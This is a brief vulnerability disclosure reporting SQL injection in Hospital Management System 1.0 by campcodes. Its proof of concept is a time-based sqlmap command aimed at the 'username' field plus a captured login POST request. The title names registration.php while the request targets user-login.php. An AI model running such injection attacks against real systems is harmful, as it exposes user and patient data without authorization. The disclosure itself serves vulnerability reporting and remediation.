

# Hospital Management System 1.0 - sqli in /hms/registration.php

- Vendor Homepage: https://www.campcodes.com
- Software Link: https://www.campcodes.com/projects/online-hospital-management-system-using-php-and-mysql/
- Version: 1.0

### POC

```bash
sqlmap -r request.txt -p username --technique T --batch --level 5
```



```http
POST /hospital/hms/user-login.php HTTP/1.1
Host: 192.168.177.1
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Origin: http://192.168.177.1
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate
Referer: http://192.168.177.1/hospital/hms/user-login.php
Cookie: PHPSESSID=b4ao6mmdbco1bcmr84grm25ihd
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
Content-Length: 68

username=test&password=111111&submit=&submit=
```



![image-20250530170822080](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505301708218.png)





![image-20250530172418576](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202505301724905.png)